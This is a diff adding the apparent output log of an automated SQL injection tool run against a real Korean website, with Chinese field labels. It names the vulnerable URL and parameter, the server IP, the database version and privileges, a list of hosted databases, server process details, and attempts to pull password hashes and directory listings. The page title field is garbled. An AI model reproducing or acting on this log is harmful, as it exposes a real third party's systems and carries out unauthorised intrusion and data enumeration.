@@ -1,0 +1,105 @@
+■漏洞信息:============================================================
+ ·URL:http://www.yonsang.net/new/focus/focus_NoticeView.asp?num=1690&num2=1&cd=6
+ ·页面标题：楷技措切背 惑版措切 悼芒雀
+ ·参数:num=1690&num2=1&cd=6
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:210.116.105.135
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 05:26:55 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 51068
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDSQBQRSRT=NMDAEHBAFMGKBOHAFBEMDNBP; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：yonsang
+- 用户名：dbo
+- 版本：Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：IWEBSQL2K
+- 服务名：MSSQLSERVER
+- 系统用户名：yonsang
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+1giga	E:\Database\MSSQL\data\1giga_Data.MDF	
+2gym	E:\Database\MSSQL\data\2gym_Data.MDF	
+abc	E:\Database\MSSQL\Data\abc_Data.MDF	
+adtsat	E:\Database\MSSQL\Data\adtsat_Data.MDF	
+arte	E:\Database\MSSQL\data\arte_Data.MDF	
+astroe	E:\Database\MSSQL\Data\astroe_Data.MDF	
+atsnews	E:\Database\MSSQL\Data\atsnew_Data.MDF	
+balianskorea	E:\Database\MSSQL\Data\balianskorea_Data.MDF	
+bitom1	E:\Database\MSSQL\Data\bitom1_Data.MDF	
+biztech	E:\Database\MSSQL\Data\biztech.mdf	
+bobbibrownkorea	E:\Database\MSSQL\Data\bobbibrownkorea_Data.MDF	
+bravopension	E:\Database\MSSQL\Data\bravopension_Data.MDF	
+buchtal	E:\Database\MSSQL\Data\buchtal_Data.MDF	
+cischem	E:\Database\MSSQL\Data\cischem_Data.MDF	
+comtelsystem	E:\Database\MSSQL\data\comtelsystem_Data.MDF	
+db013706	E:\Database\MSSQL\Data\db013706_Data.MDF	
+designadd	E:\Database\MSSQL\Data\designadd_Data.MDF	
+diauction	E:\Database\MSSQL\data\diauction_Data.MDF	
+digitalflow	E:\Database\MSSQL\Data\digitalflow_Data.MDF	
+dinkorea	E:\Database\MSSQL\Data\dinkorea_Data.MDF	
+duc	E:\Database\MSSQL\Data\duc_Data.MDF	
+dvimall	E:\Database\MSSQL\Data\dvimall_Data.MDF	
+e-corporation	E:\Database\MSSQL\Data\e-corporation_Data.MDF	
+efuture	E:\Database\MSSQL\Data\efuture_Data.MDF	
+ehrkorea	E:\Database\MSSQL\data\ehrkorea_Data.MDF	
+emskor	E:\Database\MSSQL\data\emskor_Data.MDF	
+englishjob	E:\Database\MSSQL\Data\englishjob_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	IWEBSQL2K	2288	AWAITING COMMAND	dcadmin	
+SQLAgent - Alert Engine	sleeping	IWEBSQL2K	2288	AWAITING COMMAND	dcadmin	
+Microsoft(R) Windows(R) Operating System	sleeping	DB1	840	AWAITING COMMAND	cluster	
+Microsoft(R) Windows (R) 2000 Operating System	runnable	LUXWEB1	2092	SELECT		
+Microsoft(R) Windows (R) 2000 Operating System	sleeping	LUXWEB1	2092	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+IWEBSQL2K	SQL Server	SQLOLEDB	IWEBSQL2K		IWEBSQL2K	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
